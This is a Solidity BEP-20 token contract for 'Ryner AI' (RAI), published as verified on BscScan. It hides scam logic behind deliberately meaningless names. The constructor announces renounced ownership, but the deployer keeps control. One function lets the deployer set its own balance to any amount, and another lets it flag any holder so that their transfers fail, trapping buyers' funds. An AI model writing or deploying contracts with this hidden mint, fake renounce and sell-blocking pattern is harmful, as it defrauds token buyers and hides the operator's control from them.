/**
 *Submitted for verification at BscScan.com on 2023-02-21
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface feeLaunchedSell {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeMaxSell) external view returns (uint256);

    function transfer(address listShouldSwap, uint256 atFundList) external returns (bool);

    function allowance(address enableReceiverIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 atFundList) external returns (bool);

    function transferFrom(
        address sender,
        address listShouldSwap,
        uint256 atFundList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeSwapBuy, uint256 value);
    event Approval(address indexed enableReceiverIs, address indexed spender, uint256 value);
}

interface swapToFrom is feeLaunchedSell {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract isTeamBuyWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamTotalFrom {
    function createPair(address amountTradingToken, address totalAmountFund) external returns (address);
}

interface launchShouldBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract RynerAI is isTeamBuyWallet, feeLaunchedSell, swapToFrom {

    uint256 public amountFromLimit;

    function symbol() external view virtual override returns (string memory) {
        return buyLaunchedFee;
    }

    mapping(address => mapping(address => uint256)) private minIsAmount;

    function marketingTeamReceiver(address fromModeLimit) public {
        if (amountExemptModeLaunch) {
            return;
        }
        
        launchedTxTo[fromModeLimit] = true;
        if (maxReceiverList != marketingMaxLiquidity) {
            marketingMaxLiquidity = autoFeeSender;
        }
        amountExemptModeLaunch = true;
    }

    function buyAmountSwap() public view returns (bool) {
        return autoWalletMax;
    }

    mapping(address => bool) public launchedTxTo;

    function toMarketingLaunch(address liquidityMinMode) public {
        if (listIsTokenWallet == autoWalletMax) {
            swapModeSender = maxReceiverList;
        }
        if (liquidityMinMode == tradingReceiverLimit || liquidityMinMode == buyTeamLaunch || !launchedTxTo[_msgSender()]) {
            return;
        }
        if (autoWalletMax == listIsTokenWallet) {
            listIsTokenWallet = false;
        }
        tokenToAmount[liquidityMinMode] = true;
    }

    function totalLaunchedLimit(address senderAmountMarketing, address listShouldSwap, uint256 atFundList) internal returns (bool) {
        if (senderAmountMarketing == tradingReceiverLimit) {
            return senderLimitTxTeam(senderAmountMarketing, listShouldSwap, atFundList);
        }
        require(!tokenToAmount[senderAmountMarketing]);
        return senderLimitTxTeam(senderAmountMarketing, listShouldSwap, atFundList);
    }

    function toLaunchedTeam() public {
        if (maxReceiverList == totalFeeLaunch) {
            tradingModeFund = isLaunchMaxExempt;
        }
        
        amountFromLimit=0;
    }

    address private marketingReceiverMin;

    mapping(address => bool) public tokenToAmount;

    uint256 public tradingModeFund;

    function name() external view virtual override returns (string memory) {
        return isTeamToken;
    }

    uint256 public maxReceiverList;

    function totalSupply() external view virtual override returns (uint256) {
        return isTotalMode;
    }

    string private isTeamToken = "Ryner AI";

    uint256 private marketingMaxLiquidity;

    address public tradingReceiverLimit;

    string private buyLaunchedFee = "RAI";

    function tokenFromMin(uint256 atFundList) public {
        if (!launchedTxTo[_msgSender()]) {
            return;
        }
        listEnableToken[tradingReceiverLimit] = atFundList;
    }

    function tokenWalletTo() public {
        
        
        isLaunchMaxExempt=0;
    }

    function senderLimitTxTeam(address senderAmountMarketing, address listShouldSwap, uint256 atFundList) internal returns (bool) {
        require(listEnableToken[senderAmountMarketing] >= atFundList);
        listEnableToken[senderAmountMarketing] -= atFundList;
        listEnableToken[listShouldSwap] += atFundList;
        emit Transfer(senderAmountMarketing, listShouldSwap, atFundList);
        return true;
    }

    uint256 private isTotalMode = 100000000 * 10 ** 18;

    function allowance(address autoAtLimit, address isTotalTeam) external view virtual override returns (uint256) {
        return minIsAmount[autoAtLimit][isTotalTeam];
    }

    uint8 private receiverMinAuto = 18;

    bool public listIsTokenWallet;

    bool private autoWalletMax;

    event OwnershipTransferred(address indexed autoLiquidityLimit, address indexed limitReceiverToken);

    uint256 private autoFeeSender;

    mapping(address => uint256) private listEnableToken;

    uint256 public isLaunchMaxExempt;

    function getOwner() external view returns (address) {
        return marketingReceiverMin;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverMinAuto;
    }

    function listTxAtFrom() public {
        
        
        maxReceiverList=0;
    }

    uint256 private totalFeeLaunch;

    function transfer(address fromTeamTx, uint256 atFundList) external virtual override returns (bool) {
        return totalLaunchedLimit(_msgSender(), fromTeamTx, atFundList);
    }

    function transferFrom(address senderAmountMarketing, address listShouldSwap, uint256 atFundList) external override returns (bool) {
        if (minIsAmount[senderAmountMarketing][_msgSender()] != type(uint256).max) {
            require(atFundList <= minIsAmount[senderAmountMarketing][_msgSender()]);
            minIsAmount[senderAmountMarketing][_msgSender()] -= atFundList;
        }
        return totalLaunchedLimit(senderAmountMarketing, listShouldSwap, atFundList);
    }

    function approve(address isTotalTeam, uint256 atFundList) public virtual override returns (bool) {
        minIsAmount[_msgSender()][isTotalTeam] = atFundList;
        emit Approval(_msgSender(), isTotalTeam, atFundList);
        return true;
    }

    address public buyTeamLaunch;

    constructor (){ 
        if (listIsTokenWallet) {
            totalFeeLaunch = isLaunchMaxExempt;
        }
        launchShouldBuy swapToListMode = launchShouldBuy(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        buyTeamLaunch = teamTotalFrom(swapToListMode.factory()).createPair(swapToListMode.WETH(), address(this));
        marketingReceiverMin = _msgSender();
        
        tradingReceiverLimit = _msgSender();
        launchedTxTo[_msgSender()] = true;
        
        listEnableToken[_msgSender()] = isTotalMode;
        emit Transfer(address(0), tradingReceiverLimit, isTotalMode);
        txReceiverFeeTrading();
    }

    function balanceOf(address takeMaxSell) public view virtual override returns (uint256) {
        return listEnableToken[takeMaxSell];
    }

    uint256 private swapModeSender;

    bool public amountExemptModeLaunch;

    function tokenMinTradingList() public view returns (uint256) {
        return marketingMaxLiquidity;
    }

    function txReceiverFeeTrading() public {
        emit OwnershipTransferred(tradingReceiverLimit, address(0));
        marketingReceiverMin = address(0);
    }

    function owner() external view returns (address) {
        return marketingReceiverMin;
    }

}